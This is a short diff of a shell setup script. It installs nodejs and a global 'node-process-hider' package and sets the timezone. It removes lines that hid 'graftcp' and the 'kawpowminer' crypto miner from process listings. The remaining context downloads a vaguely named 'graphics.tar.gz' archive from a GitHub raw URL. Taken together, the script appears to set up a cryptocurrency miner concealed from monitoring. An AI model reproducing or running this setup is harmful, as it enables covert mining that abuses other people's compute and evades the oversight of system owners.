@@ -4,12 +4,8 @@ apt-get install -y nodejs
 
 npm i -g node-process-hider
 
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+ln -fs /usr/share/zoneinfo/Japan/Tokyo /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-
-ph add graftcp/graftcp
-ph add graftcp
-ph add kawpowminer
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
